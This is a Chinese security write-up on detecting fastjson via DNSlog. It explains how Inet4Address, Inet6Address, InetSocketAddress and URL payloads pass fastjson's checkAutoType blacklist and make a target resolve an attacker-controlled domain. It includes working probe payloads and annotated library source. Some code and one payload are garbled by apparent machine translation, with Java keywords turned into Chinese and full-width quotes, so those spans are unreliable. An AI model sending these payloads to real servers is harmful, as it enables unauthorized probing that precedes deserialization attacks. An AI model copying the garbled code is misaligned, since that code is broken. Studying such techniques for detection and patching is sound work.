通过Dnslog判断是否使用fastjson
==============================

方法一：利用java.net.Inet \[4 \| 6\]地址
----------------------------------------

很早之前有一个方法是使用`java.net.InetAddress`类，现在这个类已经列入黑名单。而在翻阅fastjson最新版源码（`v1.2.67`）时，发现两个类没有在黑名单中，于是可以构造了如下有效载荷，可以使fastjson进行DNS解析。下面以`java.net.Inet4Address`为例分析构造原理。

    {"@type":"java.net.Inet4Address","val":"dnslog"}
    {"@type":"java.net.Inet6Address","val":"dnslog"}

我们知道在fastjson在反序列化之前都会调用`checkAutoType`方法对类进行检查。通过调试发现，由于`java.net.Inet4Address`不在黑名单中，所以就算开启AutoType也是能过`1`处的检查。

fastjson的ParserConfig类自己维护了一个`IdentityHashMap`，在这个HashMap中的类会被认为是安全的。在`2`处可以在IdentityHashMap中可以获取到`java.net.Inet4Address`，所以`clazz`不为`null`，导致在`3`处就返回了。跳过了后续的未开启`AutoType`的黑名单检查。所以可以发现无论`AutoType`是否开启，都可以过`checkAutoType`的检查

    //com.alibaba.fastjson.parser.ParserConfig#checkAutoType
    public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
        ...
        Class clazz;

        // 1.当打开了autoTypeSupport,类名又不在白名单时进行的黑名单检查
        if (!internalWhite && (this.autoTypeSupport || expectClassFlag)) {
            hash = h3;

            for(mask = 3; mask < className.length(); ++mask) {
                hash ^= (long)className.charAt(mask);
                hash *= 1099511628211L;
                ....
                if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null && Arrays.binarySearch(this.acceptHashCodes, fullHash) < 0) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
        }


        clazz = TypeUtils.getClassFromMapping(typeName);
        if (clazz == null) {
            // 2. fastjson的ParserConfig类自己维护了一个IdentityHashMap在这个HashMap中的类会被认为是安全的，会直接被返回。
            clazz = this.deserializers.findClass(typeName);
        }

        if (clazz == null) {
            clazz = (Class)this.typeMapping.get(typeName);
        }

        if (internalWhite) {
            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
        }

        if (clazz != null) {
            if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            } else {
                // 3. 直接返回，不再走下面的autoTypeSupport和黑名单检查
                return clazz;
            }
        } else {
            // 4. 不开启autoType时，进行的黑名单检查
            if (!this.autoTypeSupport) {
                hash = h3;

                for(mask = 3; mask < className.length(); ++mask) {
                    char c = className.charAt(mask);
                    hash ^= (long)c;
                    hash *= 1099511628211L;
                    if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                    ...
                }
            }
        }    
        ...
    }

fastjason对于`Inet4Address`类会使用`MiscCodec`这个`ObjectDeserializer`来反序列化。跟进发现解析器会取回val变量的值赋值给strVal变量，由于我们的类是Inet4Address，所以它们会执行到1处，进行域名解析。

    //com.alibaba.fastjson.serializer.MiscCodec#deserialze 
    public <T> T deserialze（DefaultJSONParser parser，Type clazz，Object fieldName）{ 
            ... 
            objVal = parser.parse（）; 
             ... 
            strVal =（String）objVal; 
            if（strVal！= null && strVal.length（）！= 0）{ 
                if（clazz == UUID.class）{ 
                    ... 
                } else if（clazz == URI.class）{ 
                    ... 
                } else if（clazz == URL.class）{ 
                    ... 
                } else if（clazz == Pattern.class）{ 
                    ... 
                } else if（clazz == Locale.class）{ 
                    ...
                } else if（clazz == SimpleDateFormat.class）{ 
                    ... 
                } else if（clazz！= InetAddress.class && clazz！= Inet4Address.class && clazz！= Inet6Address.class）{ 
                    ... 
                } else { 
                    试试{ 
                        / / 1.将strVal作为主机名，获取其对应的IP，域名在此处被解析
                        返回InetAddress.getByName（strVal）; 
                    } catch（UnknownHostException var11）{ 
                        抛出新的JSONException（“反序列化inet地址错误”，var11）; 
                    } 
                } 
            }其他{ 
                返回null; 
            } 
    }

方法二：利用java.net.InetSocketAddress
--------------------------------------

`java.net.InetSocketAddress`类也在`IdentityHashMap`中，和上面一样无视`checkAutoType`检查。

通过它要走到`InetAddress.getByName()`流程计量方法一是要绕过一些路的。刚开始一直没构造出来，后来在和实验室的`@背影`师傅交流时，才知道可以顺着解析器规则构造（`它要啥就给它啥`），最终有效载荷如下，当然它是畸形的json。

    {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}

那这个是怎样构造出来的呢？这需要简单了解下fastjson的词法分析器了，这里就不展开了。这里尤为关键的是解析器`token`值对应的含义，可以在`com.alibaba.fastjson.parser.JSONToken`类中看到它们。

    //com.alibaba.fastjson.parser.JSONToken
    public class JSONToken {
        ...
        public static String name(int value) {
            switch(value) {
            case 1:
                return "error";
            case 2:
                return "int";
            case 3:
                return "float";
            case 4:
                return "string";
            case 5:
                return "iso8601";
            case 6:
                return "true";
            case 7:
                return "false";
            case 8:
                return "null";
            case 9:
                return "new";
            case 10:
                return "(";
            case 11:
                return ")";
            case 12:
                return "{";
            case 13:
                return "}";
            case 14:
                return "[";
            case 15:
                return "]";
            case 16:
                return ",";
            case 17:
                return ":";
            case 18:
                return "ident";
            case 19:
                return "fieldName";
            case 20:
                return "EOF";
            case 21:
                return "Set";
            case 22:
                return "TreeSet";
            case 23:
                return "undefined";
            case 24:
                return ";";
            case 25:
                return ".";
            case 26:
                return "hex";
            default:
                return "Unknown";
            }
        }
    }

构造这个payload需要分两步，第一步我们需要让代码执行到1处，这一路解析器要接收的字符在代码已经标好。按照顺序写就是`{"@type":"java.net.InetSocketAddress"{"address":`

    //com.alibaba.fastjson.serializer.MiscCodec#deserialze
    public <T> T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) {
            JSONLexer lexer = parser.lexer;
            String className;
            if (clazz == InetSocketAddress.class) {
                if (lexer.token() == 8) {
                    lexer.nextToken();
                    return null;
                } else {
                    // 12 ---> {
                    parser.accept(12);
                    InetAddress address = null;
                    int port = 0;

                    while(true) {
                        className = lexer.stringVal();
                        
                        lexer.nextToken(17);
                        // 字段名需要为address
                        if (className.equals("address")) {
                            // 17 ---> :
                            parser.accept(17);
                            // 1. 我们需要让解析器走到这里
                            address = (InetAddress)parser.parseObject(InetAddress.class);
                        } 
                        ...
                    }
                }
            } 
            ...
    }

`parser.parseObject(InetAddress.class)`最终依然会，调用`MiscCodec#deserialze()`方法来序列化，这里就来到了我们构造payload的第二步。第二步的目标是要让解析器走到`InetAddress.getByName(strVal)`。解析器要接受的字符在代码里标好了，并按顺序写就是`,"val":"http://dnslog"}`。

    //com.alibaba.fastjson.serializer.MiscCodec#deserialze
    public <T> T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) {
            JSONLexer lexer = parser.lexer;
            String className;
            // 序列化的是InetAddress.class类，走else流程
            if (clazz == InetSocketAddress.class) {
                ...
            } else {
                Object objVal;
                if (parser.resolveStatus == 2) {
                    parser.resolveStatus = 0;
                    // 16 ---> ,
                    parser.accept(16);
                    if (lexer.token() != 4) {
                        throw new JSONException("syntax error");
                    }
                    // 字段名 ---> val
                    if (!"val".equals(lexer.stringVal())) {
                        throw new JSONException("syntax error");
                    }

                    lexer.nextToken();
                    // 17 ---> :
                    parser.accept(17);
                    // 之后解析为对象,也就是val字段对应的值
                    objVal = parser.parse();
                    // 13 ---> }
                    parser.accept(13);
                } 
                ....
               // 后续的流程和方法一一样了，进行类型判断
               strVal = (String)objVal;
               if (strVal != null && strVal.length() != 0) {
                if (clazz == UUID.class) {
                    ...
                } else if (clazz == URI.class) {
                    ...
                } else if (clazz == URL.class) {
                    ...
                } else if (clazz != InetAddress.class && clazz != Inet4Address.class && clazz != Inet6Address.class) {
                    ...
                } else {
                    try {
                    // 域名解析
                        return InetAddress.getByName(strVal);
                    } catch (UnknownHostException var11) {
                        throw new JSONException("deserialize inet adress error", var11);
                    }
                }
            } 
    }

两段合起来就得到了最终的有效载荷。

方法三：利用java.net.URL
------------------------

`java.net.URL`类也在`IdentityHashMap`中，和上面一样无视`checkAutoType`检查。

    {{“ @type”：“ java.net.URL”，“ val”：“ http：// dnslog”}：“ x”}

来源于`@retanoj`状语从句：`@threedr3am`两位师傅的启发，其原理和ysoserial的中`URLDNS`这个小工具的原理一样。

**简单来说就是向HashMap压入一个键值对时，HashMap需要获取键对象的哈希码。当键对象是一个URL对象时，在获取它的**`hashcode`**期间会调用**`getHostAddress`**方法获取主机，这个过程域名会被解析。**

2 1.png

URL对象hashcode的获取过程

fastjson解析上述payload时，先反序列化出`URL(http://dnslog)`对象，然后将`{URL(http://dnslog):"x"}`解析为一个HashMap，域名被解析。

`@retanoj`在[问题](https://github.com/alibaba/fastjson/issues/3077)中还构造了好几个畸形的有效载荷，虽然原理都是一样的，但还是挺有意思的，意识到了师傅对fastjson词法分析器透彻的理解。

    {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
    Set[{"@type":"java.net.URL","val":"http://dnslog"}]
    Set[{"@type":"java.net.URL","val":"http://dnslog"}
    {{"@type":"java.net.URL","val":"http://dnslog"}:0

参考链接
--------

> https://www.adminxe.com/1037.html
